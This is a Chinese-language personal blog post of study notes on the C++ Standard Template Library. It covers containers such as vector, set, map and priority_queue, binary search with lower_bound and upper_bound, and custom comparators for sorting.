          <h3 id="并不系统的STL学习历程"><a href="#并不系统的STL学习历程" class="headerlink" title="并不系统的STL学习历程"></a>并不系统的STL学习历程</h3><h4 id="upper-bound-amp-lower-bound"><a href="#upper-bound-amp-lower-bound" class="headerlink" title="upper_bound&amp;lower_bound"></a>upper_bound&amp;lower_bound</h4><p>在学动态规划LIS的时候知道了STL中这个算法，现简单记录。</p>
<ul>
<li><p>在升序(&gt;=)数组/容器中：</p>
<p><strong>lower_bound( begin,end,num)：</strong>从数组的[begin,end)区间二分查找第一个<strong>大于或等于</strong>num的数字，找到返回该数字的地址，不存在则返回应该插入的位置。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。</p>
<p><strong>upper_bound( begin,end,num)：</strong>从数组的[begin,end)区间二分查找第一个<strong>大于</strong>num的数字，找到返回该数字的地址，不存在则返回应该插入的位置。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。</p>
</li>
<li><p>在降序数组/容器中：</p>
<p>需要重载lower_bound和upper_bound。</p>
<p><strong>lower_bound( begin,end,num,greater<type>() )</strong>:从数组的[begin,end)区间二分查找第一个<strong>小于或等于</strong>num的数字，找到返回该数字的地址，不存在则返回应该插入的位置。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。</p>
<p><strong>upper_bound( begin,end,num,greater<type>() )</strong>:从数组的[begin,end)区间二分查找第一个<strong>小于</strong>num的数字，找到返回该数字的地址，不存在则返回应该插入的位置。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。</p>
</li>
<li><p>lower_bound即数组中插入val元素也不影响数组顺序的第一个位置，upper_bound即插入val也不影响的最后一个位置</p>
</li>
</ul>
<p>//具体原因待以后学比较器再想(<del>下次一定</del>)</p>
<h2 id="系统的STL"><a href="#系统的STL" class="headerlink" title="系统的STL"></a>系统的STL</h2><h3 id="vector——变长数组"><a href="#vector——变长数组" class="headerlink" title="vector——变长数组"></a>vector——变长数组</h3><p>使用时加上vector头文件:<code>#include &lt;vector&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
<p><code>vector&lt;typename&gt; name;</code> ——变长数组name[] <code>name.begin(),name.end()</code>取name首元素<strong>地址</strong>和尾元素地址的<strong>下一个地址</strong>（也类似于迭代器）</p>
<p><code>vector&lt;typename&gt;::iterator it</code> ——迭代器it  <code>*it</code>为迭代器指向的内容，it不支持&lt;，只有==，!=，it++，++it</p>
<blockquote>
<p>vector和string中才有name.begin()+3z这种迭代器+整数的写法（即通过下标取元素name[3]）</p>
<p>vector<int> 之间可以直接=赋值(？)</p>
</blockquote>
<p><strong>常用函数：</strong></p>
<ul>
<li><code>begin()</code>,<code>end()</code></li>
<li><code>push_back(i)</code>, <code>pop_back(i)</code>  时间复杂度O(1)</li>
<li><code>size()</code> O(1)</li>
<li><code>clear()</code> O(N)</li>
<li><code>insert(it,x)</code> O(N)  向it处插入x，比如<code>name.begin()+2</code>即向name[2]处插入x，原name[2]<strong>及</strong>后面的依次后移 </li>
<li><code>erase(it)</code> O(N) 删除it处元素</li>
<li><code>erase(first, last)</code> O(N) 删除[first, last)中所有元素</li>
</ul>
<h3 id="set——集合"><a href="#set——集合" class="headerlink" title="set——集合"></a>set——集合</h3><p>使用时加上set头文件:<code>#include &lt;set&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
<p><code>set&lt;typename&gt; name;</code> ——name内部<strong>不含重复元素</strong>且<strong>有序</strong></p>
<p><code>set&lt;typename&gt;::iterator it</code> ——迭代器it  <code>*it</code>为迭代器指向的内容，it不支持&lt;，只有==，!=，it++，++it</p>
<p><strong>常用函数：</strong></p>
<ul>
<li><code>begin()</code>，<code>end()</code></li>
<li><code>insert(x)</code> O(logN) 自动排序去重</li>
<li><code>it = name.find(x)</code> O(logN) 返回x对应的迭代器</li>
<li><code>erase(it),erase(x)</code> O(1)，O(lonN)</li>
<li><code>erase(first, last)</code> O(last-first)</li>
<li><code>size()</code> O(1)</li>
<li><code>clear()</code> O(N)</li>
</ul>
<h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>使用时加上string头文件:<code>#include &lt;string&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
<p><code>string str = &quot;abcd&quot;;</code>  ——可以通过下标str[i]访问（和vector一样）</p>
<blockquote>
<p> 只能用<code>cin</code>，<code>cout</code>（<code>#include &lt;iostream&gt;</code>）输出整个str</p>
<p><code>.c_str()</code>可以将其变为c的字符数组</p>
</blockquote>
<p><code>string::iterator it;</code> ——迭代器it</p>
<p><strong>常用函数：</strong></p>
<ul>
<li><code>begin()</code>，<code>end()</code></li>
<li><code>+=</code> 直接拼接两个string</li>
<li><code>==,!+,&lt;,&lt;=,&gt;,&gt;=</code> 按照字典序比较大小</li>
<li><code>length()/size()</code> O(1)  string长度（没有’\0’)</li>
<li><code>insert(pos,string)</code> O(N) 在pos位置插入string （pos是数字）</li>
<li><code>insert(it,it2,it3)</code> 在it处插入[it2, int3)</li>
<li><code>erase(it)</code> O(N) </li>
<li><code>erase(first,last)</code> O(N) </li>
<li><code>erase(pos,length)</code> O(N) pos是数字</li>
<li><code>clear()</code> O(1)</li>
<li><code>substr(pos,len)</code> O(len) 返回子串(类型为string）</li>
<li><code>find(str2)</code> O(nm) 在str中查找str2，返回其第一次出现的pos，如果没找到返回<code>string::npos</code></li>
<li><code>find(str2,pos)</code> O(nm) 从str的pos处开始匹配str2</li>
<li><code>replace(pos,len,str2)</code> O(N) 把str的pos位开始长位len的子串替换为str2（str2不一定要和子串一样长）</li>
<li><code>replace(it1,it2,str2)</code> O(N) 把str的[it1, it2)范围的子串替换为str2</li>
</ul>
<h3 id="map——字典"><a href="#map——字典" class="headerlink" title="map——字典"></a>map——字典</h3><p>使用时加上map头文件:<code>#include &lt;map&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
<p><code>map&lt;typename1, typename2&gt; mp;</code> ——typename1为key，typename2为value，按照键值排序</p>
<p>可以通过下标（键）访问，例如<code>mp[&#39;c&#39;]</code></p>
<blockquote>
<p>注意键是唯一的，也就是上述的’c’所对应的值只有一个，当写入另一个之前的就会被覆盖</p>
</blockquote>
<p><code>map&lt;typename1,typename2&gt;::iterator it</code> ——迭代器it  <code>it-&gt;first</code>可以访问键，<code>it-&gt;second</code>访问值</p>
<p><strong>常用函数：</strong></p>
<ul>
<li><code>begin()</code>，<code>end()</code></li>
<li><code>find(key)</code> O(logN) 返回key所对应的<strong>迭代器</strong></li>
<li><code>erase(it)</code> O(1) 删除键值对</li>
<li><code>erase(key)</code> O(logN) 删除键值对</li>
<li><code>erase(first,last)</code> O(last-first) </li>
<li><code>size()</code> O(1)</li>
<li><code>clear()</code> O(N)</li>
<li><code>insert(make_pair(&quot;haha&quot;, 5));</code> 插入键值对</li>
</ul>
<p><strong>用途：</strong></p>
<ul>
<li>建立字符串到整数的映射</li>
</ul>
<h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><p>使用时加上queue头文件:<code>#include &lt;queue&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
<p><code>queue&lt;typename&gt; name;</code> ——先进先出</p>
<p><strong>常用函数：</strong></p>
<ul>
<li><p><code>push(x),pop()</code> O(1)，O(1) 入队，队首元素出队</p>
<blockquote>
<p>入队的只是元素x的副本，当在外面修改x，并不会改变queue内的x值</p>
</blockquote>
</li>
<li><p><code>front(),back()</code> O(1)，O(1) 获取队首队尾元素</p>
</li>
<li><p><code>empty()</code> O(1) 为空返回true</p>
<blockquote>
<p>使用front和pop前要先用empty判断是否为空</p>
</blockquote>
</li>
<li><p><code>size()</code> O(1)</p>
</li>
</ul>
<p><strong>用途：</strong></p>
<ul>
<li>实现广度优先搜索</li>
</ul>
<h3 id="priority-queue"><a href="#priority-queue" class="headerlink" title="priority_queue"></a>priority_queue</h3><p>使用时加上queue头文件:<code>#include &lt;queue&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
<p><code>priority_queue&lt;typename&gt; name;</code> ——队首元素优先级最高</p>
<p>只能访问队首元素</p>
<p><strong>常见函数：</strong></p>
<ul>
<li><p><code>push(x)</code> O(logN) 将x入队</p>
</li>
<li><p><code>top()</code> O(1) 访问队首元素</p>
</li>
<li><p><code>pop()</code> O(logN) 弹出队首元素</p>
</li>
<li><p><code>empty()</code> O(1) 检测优先队列是否为空</p>
<blockquote>
<p>使用top，pop前必须先判断empty</p>
</blockquote>
</li>
<li><p><code>size()</code> O(1) </p>
</li>
</ul>
<p><strong>优先级的设置：</strong></p>
<ul>
<li><p>基本数据类型（int，char，double）</p>
<p>默认数字大的优先级高，因此以下两种写法等价</p>
<p><code>priority_queue&lt;int&gt; q;</code> <code>priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt; &gt; q;</code></p>
<p>其中<code>vector&lt;int&gt;</code>代表堆使用的容器，<code>less&lt;int&gt;</code>表示数字越大优先级越高，相应的<code>greater&lt;int&gt;</code>表示数字越小优先级越高</p>
</li>
<li><p>结构体</p>
<ul>
<li><p>友元法设定优先级</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fruit</span>&#123;</span></span><br><span class="line">	string name;</span><br><span class="line">	<span class="keyword">int</span> price;</span><br><span class="line">	<span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (fruit f1, fruit f2)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> f1.price &gt; f2.price;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//此时fruit类型的运算符&lt;已经重载成了&gt;,即以前正常比较大小,编译器会用&lt;先排序然后把最大的放在开头,现在编译器变成了用&gt;排序,但是它仍然认为是&lt;,即它会认为实际最小的数是最大的</span></span><br><span class="line"><span class="comment">//例如: 实际排序: 5&gt;4&gt;3&gt;2&gt;1(排序的结果是重载运算符的) 编译器会认为 5&lt;4&lt;3&lt;2&lt;1(但编译器认为这个序列是由小到大的),即1是最大的</span></span><br><span class="line">priority_queue&lt;fruit&gt; q;</span><br><span class="line"><span class="comment">//此时小数优先级高</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注意c++只能重载&lt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>函数法设定优先级</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fruit</span>&#123;</span></span><br><span class="line">	string name;</span><br><span class="line">	<span class="keyword">int</span> price;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(fruit f1, fruit f2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> f1.price &gt; f2.price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">priority_queue&lt;fruit, vector&lt;fruit&gt;, cmp&gt; q;</span><br><span class="line"><span class="comment">//此时只能用这种方法定义q</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>使用时加上stack头文件:<code>#include &lt;stack&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
<p><code>stack&lt;typename&gt; name;</code> ——后进先出</p>
<p><strong>常用函数：</strong></p>
<ul>
<li><code>push(x)</code> O(1)</li>
<li><code>pop()</code> O(1)</li>
<li><code>top()</code> O(1)</li>
<li><code>empty()</code> O(1)</li>
<li><code>size()</code> O(1)</li>
</ul>
<h3 id="pair——有两个元素的结构体"><a href="#pair——有两个元素的结构体" class="headerlink" title="pair——有两个元素的结构体"></a>pair——有两个元素的结构体</h3><p>使用时加上pair头文件:<code>#include &lt;utility&gt;</code>.此外还需要加上<code>using namespace std;</code></p>
<blockquote>
<p>由于在map中由pair的实现，所以map头文件中包含了utility，故无需再次定义utility</p>
</blockquote>
<p><code>pair&lt;typename1,typename2&gt; name;</code>  也可在定义的时候初始化<code>pair&lt;string,int&gt; p(&quot;abc&quot;,3)</code></p>
<p><strong>pair访问</strong>和访问结构体一样，<code>p.first</code> <code>p.second</code>即可</p>
<p><strong>pair赋值</strong>可以像结构体那样，先定义一个空pair，再<code>p.first = &quot;haha&quot;</code>来赋值；也可以使用<code>p = make_pair(&quot;haha&quot;, 5)</code>来赋值；也可以<code>p = pair&lt;string,int&gt;(&quot;haha&quot;,5)</code>来赋值</p>
<p><strong>常用函数：</strong></p>
<ul>
<li><code>==,!+,&lt;,&lt;=,&gt;,&gt;=</code> 先比较第一个元素的大小，第一个元素相等再比较第二个，返回BOOL</li>
</ul>
<p><strong>用途：</strong></p>
<ul>
<li>替代二元结构体</li>
<li>作为map的键值对来插入</li>
</ul>
<h3 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h3><ul>
<li><p>max(),min(),abs()</p>
<p>max和min必须是两个数的比较，abs参数必须是整数</p>
</li>
<li><p>swap(x,y)</p>
<p>交换xy的值</p>
</li>
<li><p>reverse(it,it2)</p>
<p>将数组指针或容器迭代器[it,it2)之间的元素反转</p>
</li>
<li><p>fill(it,it2,233)</p>
<p>将数组指针或容器迭代器[it,it2)所指向的区间用某个值覆盖</p>
</li>
<li><p>next_permutation(it,it2)</p>
<p>给出一个序列在全排列中的下一个序列，已达到最后一个时会返回false</p>
</li>
<li><p>sort(首元素地址，尾元素地址的下一个地址，[比较函数])（默认递增）</p>
<ul>
<li><p>基本数据类型数组的排序</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b;<span class="comment">//&gt;是递减排序，&lt;是递增排序</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//记忆：&gt;本身就是递减的（左边大右边小）</span></span><br></pre></td></tr></table></figure></li>
<li><p>结构体数组的排序</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">&#125;ssd[<span class="number">10</span>];</span><br><span class="line"><span class="comment">//一级排序</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node a, node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.x &gt; b.x;<span class="comment">//按照x递减排序</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//二级排序</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node a, node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.x != b.x)</span><br><span class="line">        <span class="keyword">return</span> a.x &gt; b.x;<span class="comment">//首先按照x排序</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> a.y &lt; b.y;<span class="comment">//如果x相等按照y递增排序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>容器的排序</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//容器中只有vector,string,deque(双端队列)是可以用sort排序的</span></span><br><span class="line"><span class="comment">//vector</span></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b;<span class="comment">//因为vector中元素是int所以比较int型，cmp本质是在比较元素</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//string</span></span><br><span class="line">string str[<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(string str1, string str2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str1.<span class="built_in">length</span>() &lt; str2.<span class="built_in">length</span>();<span class="comment">//按照string长度递增排序(默认是字典序递增)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>lower_bound()和upper_bound()</p>
<p>它们都需要在一个有序数组或容器中使用(增序)</p>
<p><code>lower_bound(first,last,val)</code>用来寻找数组或容器的[first,last)范围内第一个值<strong>大于等于</strong>val的数的地址，如果没有满足的则返回第一个可以插入该数的指针。</p>
<p><code>upper_bound(first,last,val)</code>用来寻找数组或容器的[first,last)范围内第一个值<strong>大于</strong>val的数的地址，如果没有满足的则返回第一个可以插入该数的指针。</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/project/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/project/">1</a><span class="page-number current">2</span><a class="page-number" href="/project/page/3/">3</a><a class="extend next" rel="next" href="/project/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Imane</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/project/archives/">
        
          <span class="site-state-item-count">22</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/project/categories/">
          
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/project/tags/">
          
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Imane</span>
</div>






        








      </div>
    </footer>
  </div>

  
  <script src="/project/lib/anime.min.js"></script>
  <script src="/project/lib/pjax/pjax.min.js"></script>
  <script src="/project/lib/velocity/velocity.min.js"></script>
  <script src="/project/lib/velocity/velocity.ui.min.js"></script>

<script src="/project/js/utils.js"></script>

<script src="/project/js/motion.js"></script>


<script src="/project/js/schemes/muse.js"></script>


<script src="/project/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  















    <div id="pjax">
  

  
      <!--

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@2.7.8/unpacked/MathJax.js?config=TeX-MML-AM_CHTML';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>
-->

<!--原配置在上面，修改参考https://blog.csdn.net/lzs781/article/details/105592503/-->
<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"] ],
        processEscapes: true
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@2.7.8/unpacked/MathJax.js?config=TeX-MML-AM_CHTML';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>


    

  

    </div>


  
  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
  
</body>
</html>
